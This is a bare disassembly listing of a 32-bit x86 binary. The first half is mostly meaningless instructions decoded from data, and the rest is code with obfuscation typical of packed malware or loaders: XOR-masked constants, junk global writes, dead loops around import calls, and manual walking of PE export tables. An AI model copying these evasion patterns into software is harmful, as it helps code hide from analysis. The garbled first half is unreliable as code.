  4080f2:	neg    BYTE PTR [esi]
  4080f4:	test   esp,0xbff785e7
  4080fa:	jl     0x40814d
  4080fc:	inc    edi
  4080fd:	jecxz  0x4080db
  4080ff:	xchg   edi,eax
  408100:	xor    BYTE PTR [ebx],cl
  408102:	test   al,0xda
  408104:	adc    edx,DWORD PTR [ecx+0x39]
  408107:	hlt    
  408108:	sbb    edx,DWORD PTR [esi-0x21]
  40810b:	lock out 0xbc,eax
  40810e:	push   ecx
  40810f:	test   eax,0xa63dbfbc
  408114:	cmp    edx,DWORD PTR [eax+0x5]
  408117:	mov    edi,0xb57dca21
  40811c:	push   ebx
  40811d:	call   0xcc0b1c34
  408122:	in     eax,0x41
  408124:	sbb    al,0x60
  408126:	inc    eax
  408127:	mov    dh,0x2b
  408129:	daa    
  40812a:	xlat   BYTE PTR ds:[ebx]
  40812b:	dec    ecx
  40812c:	lock lock int 0x87
  408130:	sti    
  408131:	(bad)  
  408132:	test   DWORD PTR [edx+ecx*8-0x54],ebx
  408136:	std    
  408137:	xchg   ebx,eax
  408138:	inc    eax
  408139:	out    dx,al
  40813a:	push   ss
  40813b:	test   al,0xbd
  40813d:	mov    al,ds:0x581754ab
  408142:	jnp    0x4080d3
  408144:	outs   dx,BYTE PTR ds:[esi]
  408145:	xchg   ebp,eax
  408146:	mov    esi,0x3e9683b5
  40814b:	fistp  DWORD PTR [edi+edi*2-0x34]
  40814f:	outs   dx,DWORD PTR ds:[esi]
  408150:	(bad)  
  408151:	adc    dh,BYTE PTR [esi]
  408153:	push   edx
  408154:	loopne 0x408195
  408156:	add    al,0xf5
  408158:	lock add edx,DWORD PTR [eax]
  40815b:	mov    BYTE PTR [eax-0x39d3fce5],bh
  408161:	cli    
  408162:	dec    ecx
  408163:	fdivrp st(1),st
  408165:	stc    
  408166:	sti    
  408167:	xor    cl,BYTE PTR [edx-0x3089c659]
  40816d:	test   DWORD PTR [edi-0x6f],esp
  408170:	pop    ebx
  408171:	lods   eax,DWORD PTR ds:[esi]
  408172:	in     al,dx
  408173:	cmc    
  408174:	(bad)  
  408176:	not    DWORD PTR [ebx-0x526137a8]
  40817c:	rcr    DWORD PTR [esi],0x4
  40817f:	es sbb al,0x41
  408182:	call   0xdc97:0xf5626ad4
  408189:	cmc    
  40818a:	js     0x408163
  40818c:	(bad)  
  40818d:	cs es fwait
  408190:	jge    0x4081cb
  408192:	cmp    al,0xd3
  408194:	mov    esi,0x6524e258
  408199:	sahf   
  40819a:	dec    eax
  40819b:	lea    ebp,es:[edx]
  40819e:	int3   
  40819f:	push   es
  4081a0:	call   0xb4113676
  4081a5:	cmp    eax,0x3b5c484d
  4081aa:	out    0xb9,eax
  4081ac:	(bad)
  4081b1:	jae    0x40816d
  4081b3:	jle    0x4081a3
  4081b5:	mov    esi,0xe388a39a
  4081ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081bb:	add    DWORD PTR [edi-0x3736fb2f],0x8651651c
  4081c5:	sbb    edi,0x731427fd
  4081cb:	sub    dl,BYTE PTR [esi-0x2b]
  4081ce:	mov    esp,0xf5192ca6
  4081d3:	add    al,0xa4
  4081d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081d6:	mov    al,0x78
  4081d8:	fdiv   DWORD PTR [ebx]
  4081da:	inc    edi
  4081db:	cmp    ebx,0x78
  4081de:	retf   
  4081df:	mov    bh,0x81
  4081e1:	inc    esi
  4081e2:	add    BYTE PTR [eax],0x8f
  4081e5:	shr    esi,1
  4081e7:	and    eax,0x6ff6e9f4
  4081ec:	pop    ss
  4081ed:	inc    eax
  4081ee:	sub    BYTE PTR [esi+0x250fa6bd],bh
  4081f4:	jp     0x4081c8
  4081f6:	adc    al,0x5
  4081f8:	and    al,0xfe
  4081fa:	sbb    DWORD PTR [ecx],edx
  4081fc:	in     al,dx
  4081fd:	pop    esp
  4081fe:	sar    BYTE PTR [esp+esi*2-0x3d1d54b3],1
  408205:	jl     0x408216
  408207:	sbb    edx,edx
  408209:	inc    esi
  40820a:	in     al,0xaa
  40820c:	inc    eax
  40820d:	loop   0x408226
  40820f:	mov    bl,0x31
  408211:	sbb    ah,BYTE PTR [esi+ebp*2+0x7cafc09e]
  408218:	mov    esp,0x43d7388
  40821d:	pop    es
  40821e:	sti    
  40821f:	stos   DWORD PTR es:[edi],eax
  408220:	pop    ecx
  408221:	or     BYTE PTR [eax],cl
  408223:	and    eax,0xaf71a776
  408228:	sub    dh,BYTE PTR [ecx+0x24a67371]
  40822e:	inc    ecx
  40822f:	inc    edx
  408230:	or     eax,0x8748e853
  408235:	mov    fs,WORD PTR [ecx+0x79]
  408238:	mov    eax,ds:0x36480a8
  40823d:	adc    al,0x41
  40823f:	or     esp,DWORD PTR [ebp+0x5c]
  408242:	(bad)  
  408243:	mov    ch,0x36
  408245:	in     eax,dx
  408246:	or     eax,0x3b33a42a
  40824b:	test   DWORD PTR cs:[esp+edi*8-0x37],edi
  408250:	mov    ?,WORD PTR [ebp+0x2a]
  408253:	test   al,0x12
  408255:	and    bh,BYTE PTR es:0xb4ddf322
  40825c:	add    al,BYTE PTR [ebp-0x7b67470e]
  408262:	mov    ch,0x72
  408264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408265:	mov    edi,0xee4d541f
  40826a:	std    
  40826b:	ret    0x26e7
  40826e:	das    
  40826f:	jno    0x40825b
  408271:	(bad)  
  408272:	out    0x8b,al
  408274:	imul   eax,DWORD PTR [esi],0xffffffac
  408277:	mov    ah,0xdb
  408279:	gs mov ch,0xef
  40827c:	(bad)  
  40827d:	jno    0x4082ee
  40827f:	out    dx,eax
  408280:	jmp    0x3a58:0xfbeb5781
  408287:	jmp    0xcc02:0xb4be8fe4
  40828e:	hlt    
  40828f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408290:	in     al,0xec
  408292:	fucomp st(4)
  408294:	scas   al,BYTE PTR es:[edi]
  408295:	and    DWORD PTR [ebx-0x3],ecx
  408298:	mov    ah,0x8c
  40829a:	xlat   BYTE PTR ds:[ebx]
  40829b:	add    eax,eax
  40829d:	cmc    
  40829e:	mov    dh,0x34
  4082a0:	(bad)  
  4082a1:	xor    dl,BYTE PTR [edi-0x665680cf]
  4082a7:	sub    al,BYTE PTR [edi-0x7d]
  4082aa:	push   ecx
  4082ab:	sub    cl,BYTE PTR [ebx+0x2ecc3bc3]
  4082b1:	push   ecx
  4082b2:	sbb    al,0x83
  4082b4:	lock ds jbe 0x408239
  4082b8:	(bad)
  4082bc:	cmp    DWORD PTR [ebp+0x8],ebp
  4082bf:	jo     0x4082d2
  4082c1:	ds loop 0x4082cd
  4082c4:	mov    ebx,0xef413996
  4082c9:	jmp    0x7ab7:0x434167c6
  4082d0:	iret   
  4082d1:	pop    ss
  4082d2:	bound  ebp,QWORD PTR [ebx+0x70]
  4082d5:	pop    ecx
  4082d6:	and    BYTE PTR [edi+0x50],bl
  4082d9:	cmp    edi,edx
  4082db:	pop    ss
  4082dc:	push   eax
  4082dd:	xor    al,0xa5
  4082df:	jp     0x408318
  4082e1:	xchg   esi,eax
  4082e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082e3:	xor    bl,ch
  4082e5:	add    dl,BYTE PTR [edx+ebx*1+0x1444df3]
  4082ec:	mov    edi,0xb4cc2641
  4082f1:	mov    ds:0x9f2b8783,eax
  4082f6:	out    dx,eax
  4082f7:	enter  0x32e,0x39
  4082fb:	lods   al,BYTE PTR ds:[esi]
  4082fc:	jl     0x408316
  4082fe:	in     al,dx
  4082ff:	cwde   
  408300:	cdq    
  408301:	cmp    cl,dl
  408303:	pop    es
  408304:	sub    BYTE PTR [edi+0x25],0x82
  408308:	idiv   BYTE PTR [esi+0x7e730360]
  40830e:	in     al,dx
  40830f:	cmp    ecx,DWORD PTR [edx+ebx*4]
  408312:	push   ss
  408313:	pop    es
  408314:	fmul   st(5),st
  408316:	cwde   
  408317:	xchg   edx,eax
  408318:	cli    
  408319:	int    0xa0
  40831b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40831c:	inc    esp
  40831d:	ins    BYTE PTR es:[edi],dx
  40831e:	jp     0x408300
  408320:	sbb    al,0xc0
  408322:	not    DWORD PTR [ebx+0xa]
  408325:	dec    esp
  408326:	sub    al,0xe7
  408328:	pop    esp
  408329:	or     DWORD PTR [edi],0x54
  40832c:	push   eax
  40832d:	fwait
  40832e:	(bad)  
  40832f:	hlt    
  408330:	cwde   
  408331:	iret   
  408332:	es push es
  408334:	pop    edi
  408335:	js     0x408349
  408337:	push   0x5f
  408339:	push   edx
  40833a:	adc    cl,BYTE PTR [edi+eax*2-0x3a2bf1]
  408341:	dec    ebp
  408342:	sub    eax,0xcae35cc2
  408347:	addr16 and ah,dl
  40834a:	(bad)  
  40834b:	shr    esi,1
  40834d:	push   cs
  40834e:	dec    ebp
  40834f:	je     0x40838f
  408351:	pop    es
  408352:	int    0x6e
  408354:	into   
  408355:	call   0xe04:0xe7ab9fe7
  40835c:	fwait
  40835d:	mov    fs,edi
  40835f:	mov    ds:0x447127fc,eax
  408364:	push   cs
  408365:	cs pop ax
  408368:	pop    edx
  408369:	test   DWORD PTR [edx-0x37],eax
  40836c:	pop    ds
  40836d:	cmp    DWORD PTR [eax-0x11],esp
  408370:	aaa    
  408371:	xchg   ax,ax
  408373:	test   DWORD PTR [edi+esi*1],esp
  408376:	dec    edi
  408377:	es jb  0x408336
  40837a:	mov    eax,ds:0xbb0a45a1
  40837f:	enter  0xd272,0x95
  408383:	mov    esp,?
  408385:	and    eax,0x385974bb
  40838a:	out    0x6e,eax
  40838c:	cmp    al,0x86
  40838e:	pop    es
  40838f:	(bad)  
  408390:	cmp    ebx,DWORD PTR [edx-0x70dde456]
  408396:	add    eax,0xe116e0e1
  40839b:	xchg   esi,eax
  40839c:	int    0x81
  40839e:	add    cl,BYTE PTR ds:0xa3555b8e
  4083a4:	lea    eax,[esi]
  4083a6:	in     al,0x66
  4083a8:	sbb    al,0xe9
  4083aa:	mov    ebp,0xdbeeb91
  4083af:	pop    esp
  4083b0:	sti    
  4083b1:	pop    eax
  4083b2:	pushf  
  4083b3:	mov    al,ds:0xe776857c
  4083b8:	jp     0x4083e3
  4083ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083bb:	out    dx,al
  4083bc:	jnp    0x4083c5
  4083be:	stos   DWORD PTR es:[edi],eax
  4083bf:	or     BYTE PTR [esi-0x2fc2e607],ah
  4083c5:	xchg   DWORD PTR cs:[ebx+0xb],ecx
  4083c9:	stos   DWORD PTR es:[edi],eax
  4083ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083cb:	mov    dl,0xfc
  4083cd:	mov    eax,ds:0x94d62fc2
  4083d2:	cmp    DWORD PTR [eax],esp
  4083d4:	pop    esp
  4083d5:	out    0xa2,al
  4083d7:	(bad)
  4083db:	lods   eax,DWORD PTR ds:[esi]
  4083dc:	pop    ebx
  4083dd:	pop    esp
  4083de:	jl     0x40843d
  4083e0:	xor    eax,0x1f111e5e
  4083e5:	jl     0x408424
  4083e7:	or     eax,0xe93525c8
  4083ec:	out    0x9f,eax
  4083ee:	jmp    0xd72:0x4dd0eca
  4083f5:	lds    ebx,FWORD PTR [ebx+0x7c565773]
  4083fb:	add    eax,0xcb17671b
  408400:	mov    edi,0x4751eac1
  408405:	dec    eax
  408406:	push   ds
  408407:	inc    esp
  408408:	icebp  
  408409:	push   es
  40840a:	mov    ah,0xd
  40840c:	imul   eax,DWORD PTR [edx],0x46b61969
  408412:	mov    edi,0x5efc77cc
  408417:	fcomp  DWORD PTR [eax-0x5032221b]
  40841d:	push   ebp
  40841e:	or     BYTE PTR [ebx],al
  408420:	sub    DWORD PTR [ebp-0x36b6fc0d],eax
  408426:	rcl    BYTE PTR [edi+esi*2+0x17],cl
  40842a:	loope  0x408476
  40842c:	dec    esp
  40842d:	ds loop 0x408436
  408430:	add    DWORD PTR [ebx-0x4a],ebx
  408433:	cld    
  408434:	adc    DWORD PTR [ebp+0x3caacfd2],esi
  40843a:	dec    edi
  40843b:	fiadd  DWORD PTR [esp+ecx*4-0x32]
  40843f:	icebp  
  408440:	xor    al,0xdb
  408442:	jecxz  0x40845e
  408444:	sub    esp,ebp
  408446:	shr    BYTE PTR [edi+edi*1+0x14],cl
  40844a:	mov    ds:0x30e6cbfe,al
  40844f:	jne    0x40844b
  408451:	sbb    ebx,esi
  408453:	call   0xb01cefc6
  408458:	stos   BYTE PTR es:[edi],al
  408459:	scas   al,BYTE PTR es:[edi]
  40845a:	jno    0x4083ee
  40845c:	xchg   esi,eax
  40845d:	lds    edx,FWORD PTR [ecx]
  40845f:	push   edx
  408460:	xor    DWORD PTR [esi-0x20],edx
  408463:	mov    ebp,0xc72e3a69
  408468:	mov    DWORD PTR [edx+0x45881004],ecx
  40846e:	dec    DWORD PTR [ebx+0x558bd045]
  408474:	hlt    
  408475:	xor    eax,esi
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x430a1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x430a48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x430a4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x430a20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
  4088df:	jmp    0x408897
  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x430a24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x430a28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
